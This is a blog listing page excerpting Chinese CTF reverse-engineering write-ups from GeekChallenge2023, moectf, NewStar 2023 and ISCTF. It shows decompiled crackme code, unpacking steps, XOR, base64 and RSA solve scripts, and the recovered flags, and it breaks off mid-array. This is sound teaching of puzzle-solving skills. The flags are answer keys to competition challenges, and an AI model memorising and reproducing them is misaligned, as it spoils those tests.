<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Page 6 | nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>nyyyddddn<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		快来和我贴贴qaq

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2023/12/28/GeekChallenge2023/" >GeekChallenge2023</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-12-28  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="点击就送的逆向题"><a href="#点击就送的逆向题" class="headerlink" title="点击就送的逆向题"></a>点击就送的逆向题</h2><p>.S的文件 使用as命令来汇编一下，然后ida打开分析逻辑</p>
<pre class="line-numbers language-none"><code class="language-none">as -o output.o input.S<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>置反一下逻辑</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-54h]</span>
  <span class="token keyword">char</span> s1<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-50h] BYREF</span>
  <span class="token keyword">char</span> s2<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-30h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-8h]</span>

  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>s2<span class="token punctuation">,</span> <span class="token string">"Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_F4<span class="token punctuation">,</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">31</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">7</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"good!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> <span class="token string">"Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    byte <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">7</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">SYC&#123;SYCTQWEFGHYIICIOJKLBNMCVBFGHSDFF&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="shiftjmp"><a href="#shiftjmp" class="headerlink" title="shiftjmp"></a>shiftjmp</h2><p>有个jmp的花指令 nop掉后，对着main u p 重新打包main函数反编译</p>
	
	</div>
  <a type="button" href="/2023/12/28/GeekChallenge2023/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2023/12/28/moectf-wp/" >moectf_wp</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-12-28  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Reverse入门指北"><a href="#Reverse入门指北" class="headerlink" title="Reverse入门指北"></a>Reverse入门指北</h2><pre class="line-numbers language-none"><code class="language-none">if ( *(_DWORD *)v7 &#x3D;&#x3D; 13 )
   sub_401082(aMoectfF1rstSt3, v6);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">aMoectfF1rstSt3 db &#39;moectf&#123;F1rst_St3p_1s_D0ne&#125;&#39;,0Ah,0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="base-64"><a href="#base-64" class="headerlink" title="base_64"></a>base_64</h2><p>pycdc 下载 编译</p>
<p>发现是base64变种</p>
<p><a target="_blank" rel="noopener" href="http://web.chacuo.net/netbasex">http://web.chacuo.net/netbasex</a></p>
<p>把索引表复制进去解密拿到flag</p>
<h2 id="UPX"><a href="#UPX" class="headerlink" title="UPX!"></a>UPX!</h2>
	
	</div>
  <a type="button" href="/2023/12/28/moectf-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2023/12/28/newstar2023-week1/" >newstar2023_week1</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-12-28  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="easy-RE"><a href="#easy-RE" class="headerlink" title="easy_RE"></a>easy_RE</h2><p>确实是打开就有</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;we1c0me_to_rev3rse!!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="elf"><a href="#elf" class="headerlink" title="elf"></a>elf</h2><p>inputString 先异或然后+16 然后base64encode后和flag cmp，decode后-16 异或就好了</p>
<pre class="line-numbers language-none"><code class="language-none">s1 &#x3D; (char *)base64_encode(v6, v3);
  if ( !strcmp(s1, &quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;) )
  
 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">_BYTE *__fastcall encode(const char *a1)
&#123;
  size_t v1; &#x2F;&#x2F; rax
  int v2; &#x2F;&#x2F; eax
  _BYTE *v4; &#x2F;&#x2F; [rsp+20h] [rbp-20h]
  int i; &#x2F;&#x2F; [rsp+28h] [rbp-18h]
  int v6; &#x2F;&#x2F; [rsp+2Ch] [rbp-14h]

  v1 &#x3D; strlen(a1);
  v4 &#x3D; malloc(2 * v1 + 1);
  v6 &#x3D; 0;
  for ( i &#x3D; 0; i &lt; strlen(a1); ++i )
  &#123;
    v2 &#x3D; v6++;
    v4[v2] &#x3D; (a1[i] ^ 0x20) + 16;
  &#125;
  v4[v6] &#x3D; 0;
  return v4;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64

<span class="token keyword">def</span> <span class="token function">custom_base64_decode</span><span class="token punctuation">(</span>encoded_str<span class="token punctuation">)</span><span class="token punctuation">:</span>
    custom_base64_chars <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>
    standard_base64_chars <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>
    translation <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>custom_base64_chars<span class="token punctuation">,</span> standard_base64_chars<span class="token punctuation">)</span>
    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>encoded_str<span class="token punctuation">.</span>translate<span class="token punctuation">(</span>translation<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>encoded_bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>
    decoded_chars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> byte <span class="token keyword">in</span> encoded_bytes<span class="token punctuation">:</span>
        char <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>byte <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x20</span><span class="token punctuation">)</span>
        decoded_chars<span class="token punctuation">.</span>append<span class="token punctuation">(</span>char<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>decoded_chars<span class="token punctuation">)</span>


encoded_str <span class="token operator">=</span> <span class="token string">"VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t"</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>xor<span class="token punctuation">(</span>custom_base64_decode<span class="token punctuation">(</span>encoded_str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">flag&#123;D0_4ou_7now_wha7_ELF_1s?&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2023/12/28/newstar2023-week1/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2023/11/29/isctf/" >isctf</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-11-29  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h2><p>运行就拿到flag了？看了一下是upx3.96</p>
<h2 id="babyRe"><a href="#babyRe" class="headerlink" title="babyRe"></a>babyRe</h2><p>反编译了一下，大概是这样一个逻辑，rsa</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum
<span class="token keyword">from</span> crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
flag <span class="token operator">=</span> <span class="token string">'ISCTF&#123;******************&#125;'</span>
flags <span class="token operator">=</span> flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
e <span class="token operator">=</span> <span class="token number">65537</span>
p <span class="token operator">=</span> libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
q <span class="token operator">=</span> libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
n <span class="token operator">=</span> p <span class="token operator">*</span> q
m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flags<span class="token punctuation">)</span>
c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
output <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'output.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>
output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'p+q ='</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>p <span class="token operator">+</span> q<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'(p+1)*(q+1)='</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'c='</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
output<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sympy <span class="token keyword">import</span> symbols<span class="token punctuation">,</span> solve<span class="token punctuation">,</span> isprime
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> inverse<span class="token punctuation">,</span> long_to_bytes


p_plus_q <span class="token operator">=</span> <span class="token number">292884018782106151080211087047278002613718113661882871562870811030932129300110050822187903340426820507419488984883216665816506575312384940488196435920320779296487709207011656728480651848786849994095965852212548311864730225380390740637527033103610408592664948012814290769567441038868614508362013860087396409860</span>

p_plus_1_q_plus_1 <span class="token operator">=</span> <span class="token number">21292789073160227295768319780997976991300923684414991432030077313041762314144710093780468352616448047534339208324518089727210764843655182515955359309813600286949887218916518346391288151954579692912105787780604137276300957046899460796651855983154616583709095921532639371311099659697834887064510351319531902433355833604752638757132129136704458119767279776712516825379722837005380965686817229771252693736534397063201880826010273930761767650438638395019411119979149337260776965247144705915951674697425506236801595477159432369862377378306461809669885764689526096087635635247658396780671976617716801660025870405374520076160</span>
ciphertext <span class="token operator">=</span> <span class="token number">5203005542361323780340103662023144468501161788183930759975924790394097999367062944602228590598053194005601497154183700604614648980958953643596732510635460233363517206803267054976506058495592964781868943617992245808463957957161100800155936109928340808755112091651619258385206684038063600864669934451439637410568700470057362554045334836098013308228518175901113235436257998397401389511926288739759268080251377782356779624616546966237213737535252748926042086203600860251557074440685879354169866206490962331203234019516485700964227924668452181975961352914304357731769081382406940750260817547299552705287482926593175925396</span>
e <span class="token operator">=</span> <span class="token number">65537</span>

n <span class="token operator">=</span> p_plus_1_q_plus_1 <span class="token operator">-</span> p_plus_q <span class="token operator">-</span> <span class="token number">1</span>

p<span class="token punctuation">,</span> q <span class="token operator">=</span> symbols<span class="token punctuation">(</span><span class="token string">'p q'</span><span class="token punctuation">)</span>
solutions <span class="token operator">=</span> solve<span class="token punctuation">(</span><span class="token punctuation">[</span>p <span class="token operator">+</span> q <span class="token operator">-</span> p_plus_q<span class="token punctuation">,</span> p<span class="token operator">*</span>q <span class="token operator">-</span> n<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">,</span> q <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>sol<span class="token punctuation">)</span> <span class="token keyword">for</span> sol <span class="token keyword">in</span> solutions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">if</span> isprime<span class="token punctuation">(</span>sol<span class="token punctuation">)</span><span class="token punctuation">]</span>

phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>

m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="mfx-re"><a href="#mfx-re" class="headerlink" title="mfx_re"></a>mfx_re</h2><p>mfx? 搜索了一下，是修改了 upx的特征，把upx! 的字段修改成了mfx!，010edit中把文件里面几个mfx! 修改成upx! 就能用upx -d解压了，readelf -a也能看到符号表</p>
<p>关键逻辑是这里，++一下就好了</p>
	
	</div>
  <a type="button" href="/2023/11/29/isctf/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2023/11/05/newstar-week2/" >newstar_week2</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-11-05  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="PZthon"><a href="#PZthon" class="headerlink" title="PZthon"></a>PZthon</h2><p>发现是python写的，先用 pyinstxtractor解包，然后将PZthon.pyc用pycdc反编译得到源码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Source Generated with Decompyle++</span>
<span class="token comment"># File: PZthon.pyc (Python 3.9)</span>


<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    art <span class="token operator">=</span> <span class="token string">'\n              ___                                                                      \n    //   ) )     / /    //   ) )  // | |     / /        // | |  \\ / / \\    / /       \n   //___/ /     / /    //        //__| |    / /        //__| |   \\  /   \\  / /        \n  / ____ /     / /    //  ____  / ___  |   / /        / ___  |   / /     \\/ /         \n //           / /    //    / / //    | |  / /        //    | |  / /\\     / /          \n//           / /___ ((____/ / //     | | / /____/ / //     | | / /  \\   / /           \n                                                                                       \n     / /        //   / / ||   / / //   / /  / /       /__  ___/ ||   / |  / / //   ) ) \n    / /        //____    ||  / / //____    / /          / /     ||  /  | / / //   / /  \n   / /        / ____     || / / / ____    / /          / /      || / /||/ / //   / /   \n  / /        //          ||/ / //        / /          / /       ||/ / |  / //   / /    \n / /____/ / //____/ /    |  / //____/ / / /____/ /   / /        |  /  | / ((___/ /     \n'</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>art<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Please give me the flag: '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

enc <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">115</span><span class="token punctuation">,</span>
    <span class="token number">121</span><span class="token punctuation">,</span>
    <span class="token number">116</span><span class="token punctuation">,</span>
    <span class="token number">114</span><span class="token punctuation">,</span>
    <span class="token number">110</span><span class="token punctuation">,</span>
    <span class="token number">76</span><span class="token punctuation">,</span>
    <span class="token number">37</span><span class="token punctuation">,</span>
    <span class="token number">96</span><span class="token punctuation">,</span>
    <span class="token number">88</span><span class="token punctuation">,</span>
    <span class="token number">116</span><span class="token punctuation">,</span>
    <span class="token number">113</span><span class="token punctuation">,</span>
    <span class="token number">112</span><span class="token punctuation">,</span>
    <span class="token number">36</span><span class="token punctuation">,</span>
    <span class="token number">97</span><span class="token punctuation">,</span>
    <span class="token number">65</span><span class="token punctuation">,</span>
    <span class="token number">125</span><span class="token punctuation">,</span>
    <span class="token number">103</span><span class="token punctuation">,</span>
    <span class="token number">37</span><span class="token punctuation">,</span>
    <span class="token number">96</span><span class="token punctuation">,</span>
    <span class="token number">114</span><span class="token punctuation">,</span>
    <span class="token number">125</span><span class="token punctuation">,</span>
    <span class="token number">65</span><span class="token punctuation">,</span>
    <span class="token number">39</span><span class="token punctuation">,</span>
    <span class="token number">112</span><span class="token punctuation">,</span>
    <span class="token number">70</span><span class="token punctuation">,</span>
    <span class="token number">112</span><span class="token punctuation">,</span>
    <span class="token number">118</span><span class="token punctuation">,</span>
    <span class="token number">37</span><span class="token punctuation">,</span>
    <span class="token number">123</span><span class="token punctuation">,</span>
    <span class="token number">113</span><span class="token punctuation">,</span>
    <span class="token number">69</span><span class="token punctuation">,</span>
    <span class="token number">79</span><span class="token punctuation">,</span>
    <span class="token number">82</span><span class="token punctuation">,</span>
    <span class="token number">84</span><span class="token punctuation">,</span>
    <span class="token number">89</span><span class="token punctuation">,</span>
    <span class="token number">84</span><span class="token punctuation">,</span>
    <span class="token number">77</span><span class="token punctuation">,</span>
    <span class="token number">76</span><span class="token punctuation">,</span>
    <span class="token number">36</span><span class="token punctuation">,</span>
    <span class="token number">112</span><span class="token punctuation">,</span>
    <span class="token number">99</span><span class="token punctuation">,</span>
    <span class="token number">112</span><span class="token punctuation">,</span>
    <span class="token number">36</span><span class="token punctuation">,</span>
    <span class="token number">65</span><span class="token punctuation">,</span>
    <span class="token number">39</span><span class="token punctuation">,</span>
    <span class="token number">116</span><span class="token punctuation">,</span>
    <span class="token number">97</span><span class="token punctuation">,</span>
    <span class="token number">36</span><span class="token punctuation">,</span>
    <span class="token number">102</span><span class="token punctuation">,</span>
    <span class="token number">86</span><span class="token punctuation">,</span>
    <span class="token number">37</span><span class="token punctuation">,</span>
    <span class="token number">37</span><span class="token punctuation">,</span>
    <span class="token number">36</span><span class="token punctuation">,</span>
    <span class="token number">104</span><span class="token punctuation">]</span>
data <span class="token operator">=</span> hello<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">21</span>
<span class="token keyword">if</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span> <span class="token operator">==</span> data<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'WOW!!'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'I believe you can do it!'</span><span class="token punctuation">)</span>
<span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'To be continue...'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>异或一下拿到flag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">enc <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">115</span><span class="token punctuation">,</span>
    <span class="token number">121</span><span class="token punctuation">,</span>
    <span class="token number">116</span><span class="token punctuation">,</span>
    <span class="token number">114</span><span class="token punctuation">,</span>
    <span class="token number">110</span><span class="token punctuation">,</span>
    <span class="token number">76</span><span class="token punctuation">,</span>
    <span class="token number">37</span><span class="token punctuation">,</span>
    <span class="token number">96</span><span class="token punctuation">,</span>
    <span class="token number">88</span><span class="token punctuation">,</span>
    <span class="token number">116</span><span class="token punctuation">,</span>
    <span class="token number">113</span><span class="token punctuation">,</span>
    <span class="token number">112</span><span class="token punctuation">,</span>
    <span class="token number">36</span><span class="token punctuation">,</span>
    <span class="token number">97</span><span class="token punctuation">,</span>
    <span class="token number">65</span><span class="token punctuation">,</span>
    <span class="token number">125</span><span class="token punctuation">,</span>
    <span class="token number">103</span><span class="token punctuation">,</span>
    <span class="token number">37</span><span class="token punctuation">,</span>
    <span class="token number">96</span><span class="token punctuation">,</span>
    <span class="token number">114</span><span class="token punctuation">,</span>
    <span class="token number">125</span><span class="token punctuation">,</span>
    <span class="token number">65</span><span class="token punctuation">,</span>
